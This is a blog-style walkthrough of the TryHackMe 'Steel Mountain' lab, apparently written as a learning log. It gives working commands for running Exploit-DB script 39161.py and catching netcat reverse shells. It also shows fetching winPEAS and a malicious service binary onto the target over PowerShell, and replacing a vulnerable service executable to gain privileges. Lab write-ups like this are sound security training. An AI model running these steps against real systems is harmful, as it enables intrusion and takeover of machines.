---
title: 'TryHackMe: Complete Beginner'
date: 2021-11-08 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-11-08-tryhackme-complete-beginner.html
author: 100007
---

# TryHackMe: Complete Beginner

**author:** Nathan Acks  
**date:** 2021-11-08

# Steel Mountain

Things got busy yesterday and I had to push finishing this section off a day. The machine’s new IP address is 10.10.174.199.

## Access and Escalation Without Metasploit

The alternate exploit we’re going to run for this is located at /usr/share/exploitdb/exploits/windows/remote/39161.py on Kali Linux. To set this up, we’re going to use a quick-n-dirty Python web server containing a statically-compiled version of netcat. This needs to be running on port 80 for the exploit to work (don’t forget to punch a hole through the firewall for this!).

```
mkdir 1
cd 1
cp /usr/share/windows-binaries/nc.exe .
curl -O https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
sudo python3 -m http.server 80
```

Ready our listener in another terminal. Note that WinPEAS generates _a lot_ of output, so we need to increase TMUX history buffer (`set -g history-limit 8192`) in order to be able to capture all of it. This needs to be set _before_ creating the window that we’re going to catch our reverse shell in!

```
nc -lvnp 4444
```

Copy, setup, and run the exploit!

```
cp /usr/share/exploitdb/exploits/windows/remote/39161.py .
nano 39161.py # Change ip_addr and local_port
python2 39161.py 10.10.174.199 8080
python2 39161.py 10.10.174.199 8080
```

Once we’re in (the exploit needs to be run twice to work), we need to grab and run winPEASx64.exe from our web server.

```
powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/winPEASx64.exe -OutFile winPEASx64.exe"
.\winPEASx64.exe
```

Interestingly, while WinPEAS notes that ASCServie.exe is vulnerable to an overwrite, it looks like it misses the fact that the compromised user can restart it. That said, WinPEAS does display _a lot_ more information than PowerUp, so it might be useful to run _both_…

Useful PowerShell commands:

- `Get-Service` - list all services, or drill down on a particular service.
- `sc.exe stop $SERVICE`/`sc.exe start $SERVICE` - stop/start $SERVICE.

Putting this all together, we can replicate yesterday’s compromise by:

```
powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/ASCService.exe -OutFile ASCService.exe"
sc.exe stop AdvancedSystemCareService9
copy "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
ASCService.exe.bak
copy /Y ASCService.exe
"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
sc.exe start AdvancedSystemCareService9
```

Where ASCService.exe is the same compromise as last time, and we again catch the reverse shell using:

```
nc -lvnp 4443
```

- [2021-11-07 - TryHackMe: Complete Beginner](https://cardboard-iguana.com/log/2021-11-07-tryhackme-complete-beginner.html)
